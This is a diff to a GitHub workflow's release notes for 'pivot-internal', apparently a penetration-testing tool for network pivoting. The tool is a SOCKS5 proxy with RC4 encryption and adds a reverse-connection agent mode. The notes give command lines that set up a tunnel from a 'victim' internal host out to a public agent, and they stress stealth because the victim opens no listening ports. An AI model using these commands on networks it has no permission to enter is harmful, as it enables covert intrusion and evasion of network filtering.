@@ -85,11 +85,23 @@ jobs:
           ## Pivot Internal Tool Release
           
           ### Features
-          - SOCKS5 proxy with RC4 encryption
+          - **Dual Architecture Support**: Traditional direct connection + New agent-based reverse connection
+          - SOCKS5 proxy with RC4 encryption throughout entire chain
+          - **Agent Server**: Central relay for victim-to-multiple-clients scenarios
+          - **Reverse Connection Capability**: Victim connects outbound only (no listening ports)
           - Multiple concurrent clients support
           - Cross-platform compatibility
-          - Connection tracking and logging
-          - Graceful shutdown handling
+          - Connection tracking and logging with unique IDs
+          - Graceful shutdown handling with signal support
+          - IPv4, IPv6, and domain name resolution
+          
+          ### Architecture Options
+          
+          #### Traditional Mode (Direct Connection)
+          Client → Server (victim listens for direct connections)
+          
+          #### Agent Mode (Reverse Connection) ⭐ NEW
+          Client → Agent → Victim (victim connects out to agent, no listening ports)
           
           ### Binaries
           This release includes binaries for:
@@ -97,18 +109,57 @@ jobs:
           - **macOS**: amd64 (Intel), arm64 (Apple Silicon)
           - **Linux**: amd64, arm64
           
-          ### Usage
-          1. Download the appropriate binary for your platform
-          2. Make it executable (Linux/macOS): `chmod +x pivot-internal-*`
-          3. Run server: `./pivot-internal server -key secret -l :1080`
-          4. Run client: `./pivot-internal client -key secret -r server:1080 -l :1081`
+          ### Usage Examples
+          
+          #### Traditional Mode
+          ```bash
+          # Server (victim network)
+          ./pivot-internal server -key secret123 -l :1080
+          
+          # Client (your machine)
+          ./pivot-internal client -key secret123 -r victim-ip:1080 -l :1081
+          ```
+          
+          #### Agent Mode (NEW - Recommended for restrictive networks)
+          ```bash
+          # 1. Agent (public server)
+          ./pivot-internal agent -key secret123 -l :1080 -i :8000
+          
+          # 2. Victim (internal network - connects OUT only)
+          ./pivot-internal server -key secret123 -c agent-ip:8000
+          
+          # 3. Client(s) (your machines)
+          ./pivot-internal client -key secret123 -r agent-ip:1080 -l :1081
+          ./pivot-internal client -key secret123 -r agent-ip:1080 -l :1082
+          ```
+          
+          #### Test Connection
+          ```bash
+          # Test through SOCKS5 proxy
+          curl -x socks5h://127.0.0.1:1081 https://1.1.1.1/cdn-cgi/trace
+          ```
+          
+          ### When to Use Each Architecture
+          
+          **Use Traditional Mode when:**
+          - Direct network access to internal network
+          - Internal network allows inbound connections
+          - Simple setup preferred
+          
+          **Use Agent Mode when:**
+          - Internal network has strict inbound filtering
+          - Victim can only make outbound connections
+          - Need centralized management of multiple clients
+          - Enhanced stealth required (no listening ports on victim)
           
           ### Security Notes
-          - Use strong encryption keys
+          - All traffic encrypted with RC4
+          - Use strong encryption keys (avoid default examples)
           - For authorized penetration testing only
           - Verify checksums before use
+          - Agent mode provides better stealth (victim opens no listening ports)
           
-          See the [README](https://github.com/${{ github.repository }}/blob/main/README.md) for detailed usage instructions.
+          See the [README](https://github.com/${{ github.repository }}/blob/main/README.md) for detailed usage instructions and architecture diagrams.
         files: |
           build/pivot-internal-windows-amd64.exe
           build/pivot-internal-windows-386.exe
